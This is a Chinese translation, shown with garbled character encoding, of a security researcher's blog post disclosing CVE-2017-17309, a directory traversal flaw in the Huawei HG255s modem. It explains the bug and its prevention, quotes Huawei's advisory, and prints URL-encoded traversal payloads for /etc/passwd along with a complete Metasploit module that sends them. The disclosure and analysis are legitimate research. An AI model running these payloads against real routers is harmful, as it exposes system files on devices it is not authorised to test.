# åä¸º HG255s äº§å“ä¸­çš„ç›®å½•éå†æ¼æ´

> åŸæ–‡ï¼š<https://infosecwriteups.com/directory-ttraversal-vulnerability-in-huawei-hg255s-products-dce941a1d015?source=collection_archive---------1----------------------->

![](img/5ef2c4b27ca8d65f8468272618926067.png)

åä¸º HG255s

æˆ‘æƒ³è°ˆè°ˆæˆ‘ä»¬è¿‡å»å‘ç°çš„ä¸€ä¸ªæ¼æ´ã€‚æˆ‘æƒ³é‡æ–°å‘å¸ƒè¿™ä¸ªä¸é”™çš„å®‰å…¨ç ”ç©¶ï¼Œè¿™æ ·å®ƒå°±å¯ä»¥åœ¨æˆ‘çš„åšå®¢ä¸Šã€‚æˆ‘ä»¬å‘ç°çš„è¿™ä¸ªäº§å“å®é™…ä¸Šå±äº Turkcellï¼Œå®ƒæ˜¯åœŸè€³å…¶çš„ä¸€å®¶å›½å†…äº’è”ç½‘åŸºç¡€è®¾æ–½æä¾›å•†ã€‚å®ƒå°†è¿™ç§è°ƒåˆ¶è§£è°ƒå™¨ä½œä¸ºæ ‡å‡†è°ƒåˆ¶è§£è°ƒå™¨æä¾›ç»™äº’è”ç½‘ç”¨æˆ·ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å¯ä»¥è¯´æœ‰æ•°ç™¾ä¸‡äººåœ¨ä½¿ç”¨å®ƒã€‚æ­¤å¤–ï¼Œåä¸ºè¿˜ä¸“é—¨ä¸º Turkcell å¼€å‘äº†è¿™æ¬¾äº§å“ã€‚å› æ­¤ï¼Œè€ƒè™‘é’ˆå¯¹æŸä¸ªå›½å®¶ä½¿ç”¨çš„ç‰¹å®šäº§å“çš„ç½‘ç»œæ”»å‡»çš„å¯èƒ½æ€§ã€‚å¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬å–„æ„çš„å®‰å…¨ç ”ç©¶äººå‘˜å·²ç»æŠ¥å‘Šäº†è¿™ä¸€æƒ…å†µã€‚å½“æˆ‘ä»¬å¯¹è¯¥äº§å“è¿›è¡Œå®‰å…¨ç ”ç©¶æ—¶ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°äº†ç›®å½•éå†æ¼æ´å¹¶æŠ¥å‘Šäº†è¯¥æ¼æ´ã€‚æˆ‘ç”šè‡³ä¸ºè¿™ä¸ªæ¼æ´å¼€å‘äº†ä¸€ä¸ª metasploit æ¨¡å—ã€‚

ç›®å½•éå†ï¼Œä¹Ÿç§°ä¸ºâ€œæ–‡ä»¶è·¯å¾„éå†â€æˆ–â€œç‚¹ç‚¹æ–œæ â€ï¼Œæ˜¯ä¸€ç§æ¼æ´ï¼Œä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿè®¿é—®å­˜å‚¨åœ¨ web åº”ç”¨ç¨‹åºæ ¹ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶å’Œç›®å½•ã€‚å½“ web åº”ç”¨ç¨‹åºæ²¡æœ‰æ­£ç¡®éªŒè¯ç”¨æˆ·è¾“å…¥æ—¶ï¼Œå°±ä¼šå‡ºç°æ­¤æ¼æ´ï¼Œä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿæ“çºµæ–‡ä»¶è·¯å¾„æ¥è®¿é—®æ ¹ç›®å½•ä»¥å¤–çš„æ–‡ä»¶å’Œç›®å½•ã€‚

ä¾‹å¦‚ï¼Œè€ƒè™‘ä¸€ä¸ªå…è®¸ç”¨æˆ·å°†å›¾åƒä¸Šä¼ åˆ°â€œç…§ç‰‡â€ç›®å½•çš„ web åº”ç”¨ç¨‹åºã€‚å¦‚æœ web åº”ç”¨ç¨‹åºæ²¡æœ‰æ­£ç¡®éªŒè¯ä¸Šä¼ å›¾åƒçš„æ–‡ä»¶è·¯å¾„ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šä¸Šä¼ å¸¦æœ‰æ¶æ„æ–‡ä»¶è·¯å¾„çš„å›¾åƒï¼Œä¾‹å¦‚â€œ../../etc/passwd "ï¼Œè¯•å›¾è®¿é—®ç³»ç»Ÿçš„å¯†ç æ–‡ä»¶ã€‚è¿™ç§ç±»å‹çš„æ”»å‡»æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºâ€œ../â€åºåˆ—å‘Šè¯‰ web åº”ç”¨ç¨‹åºå‘ä¸Šä¸€çº§ç›®å½•ã€‚é€šè¿‡ä½¿ç”¨å¤šä¸ªâ€œ../â€åºåˆ—ï¼Œæ”»å‡»è€…å¯ä»¥éå†å¤šä¸ªçº§åˆ«ï¼Œå¹¶å¯èƒ½è®¿é—®å­˜å‚¨åœ¨ web åº”ç”¨ç¨‹åºæ ¹ç›®å½•ä¹‹å¤–çš„æ•æ„Ÿæ–‡ä»¶å’Œç›®å½•ã€‚

ä¸ºäº†é˜²æ­¢ç›®å½•éå†æ¼æ´ï¼Œå¯¹äº web å¼€å‘äººå‘˜æ¥è¯´ï¼Œæ­£ç¡®éªŒè¯å’Œå‡€åŒ–ç”¨æˆ·è¾“å…¥ä»¥ç¡®ä¿å®ƒä¸åŒ…å«ä»»ä½•æ¶æ„æ–‡ä»¶è·¯å¾„æ˜¯éå¸¸é‡è¦çš„ã€‚è¿™å¯ä»¥é€šè¿‡ä½¿ç”¨è¾“å…¥éªŒè¯ã€ç™½åå•å’Œå‡€åŒ–ç­‰æŠ€æœ¯æ¥å®ç°ã€‚é€šè¿‡å¯¹æ•æ„Ÿæ–‡ä»¶å’Œç›®å½•è®¾ç½®é€‚å½“çš„æƒé™æ¥é˜²æ­¢æœªç»æˆæƒçš„è®¿é—®ï¼Œä»è€Œé€‚å½“åœ°ä¿æŠ¤æ–‡ä»¶ç³»ç»Ÿä¹Ÿå¾ˆé‡è¦ã€‚

å®‰å…¨æ¼æ´çš„åŸå› æ˜¯ä»€ä¹ˆï¼Ÿ

å½“æ‚¨æ£€æŸ¥ä¸‹é¢çš„ metasploit æ¨¡å—æ—¶ï¼Œ4 ä¸ªä¸åŒçš„ç›®å½•å—åˆ°æ­¤æ¼æ´çš„å½±å“ï¼›

```
'/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',
'/lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',
'/res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',
'/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'
```

> **åä¸ºä¸ºæˆ‘ä»¬å‘å¸ƒçš„æ–‡ç« :**

åä¸ºæ³¨æ„åˆ°å®‰å…¨ç ”ç©¶å‘˜ Ahmet Mersin æŠ«éœ²äº†åä¸º HG255s ä¸­çš„ä¸€ä¸ª**ç›®å½•éå†æ¼æ´**ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œå®‰å…¨ç ”ç©¶äººå‘˜ Bar aryldlrmã€Ahmet Mersin å’Œ Ismail Tasdelen å·²ç»å‘åä¸º PSIRT å‘é€äº†è¯¥æ¼æ´ã€‚åä¸ºç«‹å³å±•å¼€å½»æŸ¥ã€‚

åä¸ºå·²ç»å®Œæˆè°ƒæŸ¥ã€‚**åä¸º HG255s** å—æ­¤æ¼æ´å½±å“(**CVE-2017â€“17309**)ï¼Œåä¸ºå·²ç»å‘å—å½±å“çš„è¿è¥å•†æä¾›äº†ä¿®å¤æ–¹æ¡ˆã€‚è¿è¥å•†å‘å¸ƒäº†ä¸€ä¸ªå›ºå®šç‰ˆæœ¬ã€‚å—å½±å“çš„äº§å“å°†æ”¶åˆ°ç³»ç»Ÿæ›´æ–°æç¤ºï¼Œç”¨æˆ·å¯ä»¥å®‰è£…æ›´æ–°æ¥ä¿®å¤æ¼æ´ã€‚

![](img/0dc16a6821727e443cfc4eb0060b6424.png)

CVE-2017â€“17309

æˆ‘ä»¬å¯¹å·´å°”æ‰å°”å¾·å‹’å§†ã€è‰¾å“ˆè¿ˆå¾·Â·æ¢…å°”è¾›å’Œä¼Šæ–¯æ¢…å°”Â·å¡”æ–¯å¾·ä¼¦å¯¹åä¸ºäº§å“çš„å…³æ³¨è¡¨ç¤ºæ„Ÿè°¢ã€‚

> **æ¦‚å¿µéªŒè¯è§†é¢‘:**

æ¼æ´ 0lab youtube é¢‘é“

> **CVSS è¯„åˆ†:**

*åŸºç¡€åˆ†:***7.5 é«˜**

**CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N**

> ***Metasploit ä»£ç :***

```
*##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#
##

class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient

   def initialize
       super(
           'Name'        => 'Huawei HG255 Directory Traversal',
           â€˜Descriptionâ€™ => â€˜Server Directory Traversal at Huawei HG255 by malicious GET requestsâ€™,
           â€˜Authorâ€™      => â€˜Ismail Tasdelenâ€™,
           â€˜Licenseâ€™     => MSF_LICENSE,
           â€˜Referencesâ€™     =>
           [
              ['CVE', '2017-17309' ],
              ['URL', 'https://www.huawei.com/en/psirt/security-notices/huawei-sn-20170911-01-hg255s-en']
           ]
       )
       register_options(
           [
               Opt::RPORT(80)
           ], self.class
       )
   end

   def run
       urllist=[
           â€˜/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwdâ€™,
           â€˜/lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwdâ€™,
           â€˜/res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwdâ€™,
           â€˜/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwdâ€™]

       urllist.each do |url|
           begin
               res = send_request_raw(
               {
                       â€˜methodâ€™=> â€˜GETâ€™,
                       â€˜uriâ€™=> url
               })

               if res
                   print_good(â€œVulnerable! for #{url}â€)
               else
                   print_status(â€œVulnerable(no response) detected for #{url}â€)
               end
           rescue Errno::ECONNRESET
               print_status(â€œVulnerable(rst) detected for #{url}â€)
           rescue Exception
               print_error(â€œConnection failed.â€)
           end
       end
   end*
```

> ***ä¿®æ”¹å†å²:***

*2018â€“06â€“06v 1.1 æ›´æ–°æ›´æ–°å®‰å…¨å…¬å‘Šæè¿°ä¿¡æ¯*

*2017 å¹´ 9 æœˆ 11 æ—¥ 1.0 ç‰ˆåˆå§‹*

> ***æ„Ÿè°¢ä¿¡:***

*![](img/7519395c34a8e2921daf8dbd3083202f.png)*

***è‡´è°¢å‡½***

> ***å‚è€ƒæ–‡çŒ®:***

*[](https://nvd.nist.gov/vuln/detail/CVE-2017-17309) [## NVD

### å·²ä¿®æ”¹è‡ª NVD ä¸Šæ¬¡åˆ†æä»¥æ¥ï¼Œæ­¤æ¼æ´å·²è¢«ä¿®æ”¹ã€‚å®ƒæ­£åœ¨ç­‰å¾…é‡æ–°åˆ†æâ€¦

nvd.nist.gov](https://nvd.nist.gov/vuln/detail/CVE-2017-17309) [](https://github.com/exploit-labs/huawei_hg255s_exploit) [## GitHub-exploit-labs/åä¸º _hg255s_exploit:ğŸš€åä¸º HG255s â˜„ï¸çš„æœåŠ¡å™¨ç›®å½•éå†â€¦

### ğŸš€åä¸º HG255s â˜„ï¸çš„æœåŠ¡å™¨ç›®å½•éå†- CVE-2017-17309ğŸš€-GitHub-exploit-labs/Huawei _ Hg 255s _ exploit:ğŸš€â€¦

github.com](https://github.com/exploit-labs/huawei_hg255s_exploit) [](http://www.huawei.com/en/psirt/security-notices/huawei-sn-20170911-01-hg255s-en) [## åä¸º-sn-20170911-01-hg255s-en

### æœ¬ç½‘ç«™ä½¿ç”¨ cookiesã€‚é€šè¿‡ç»§ç»­æµè§ˆç½‘ç«™ï¼Œæ‚¨åŒæ„æˆ‘ä»¬ä½¿ç”¨ cookiesã€‚é˜…è¯»æˆ‘ä»¬çš„éšç§â€¦

www.huawei.com](http://www.huawei.com/en/psirt/security-notices/huawei-sn-20170911-01-hg255s-en) [](https://www.exploit-db.com/exploits/47923) [## æ”»å‡»æ€§å®‰å…¨åˆ©ç”¨æ•°æ®åº“æ¡£æ¡ˆ

### åä¸º HG255 -ç›®å½•éå†(Metasploit)..ç¡¬ä»¶å¹³å°çš„ webapps æ¼æ´

www.exploit-db.com](https://www.exploit-db.com/exploits/47923)  [## å®‰å…¨æ¼æ´ç ”ç©¶å®éªŒå®¤

### å®‰å…¨æ¼æ´ç ”ç©¶å®éªŒå®¤

æ¼æ´å®éªŒå®¤-LABORATORYwww.vulnerability-lab.com å®‰å…¨æ¼æ´ç ”ç©¶](https://www.vulnerability-lab.com/show.php?user=Ismail+Tasdelen) ![](img/49c1f6f7816f41206441555b10934760.png)

BB-8 æœºå™¨äºº

åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘è°ˆåˆ°äº†æˆ‘ä»¬å‘ç°çš„æ¼æ´å’Œæˆ‘å¼€å‘çš„åˆ©ç”¨ç¨‹åºã€‚ä¿é‡ï¼Œåœ¨æˆ‘çš„ä¸‹ä¸€ç¯‡æ–‡ç« ä¸­å†è§ã€‚

## æ¥è‡ª Infosec çš„æŠ¥é“:Infosec æ¯å¤©éƒ½æœ‰å¾ˆå¤šå†…å®¹ï¼Œå¾ˆéš¾è·Ÿä¸Šã€‚[åŠ å…¥æˆ‘ä»¬çš„æ¯å‘¨ç®€è®¯](https://weekly.infosecwriteups.com/)ä»¥ 5 ç¯‡æ–‡ç« ã€4 ä¸ªçº¿ç¨‹ã€3 ä¸ªè§†é¢‘ã€2 ä¸ª GitHub Repos å’Œå·¥å…·ä»¥åŠ 1 ä¸ªå·¥ä½œæé†’çš„å½¢å¼å…è´¹è·å–æ‰€æœ‰æœ€æ–°çš„ Infosec è¶‹åŠ¿ï¼*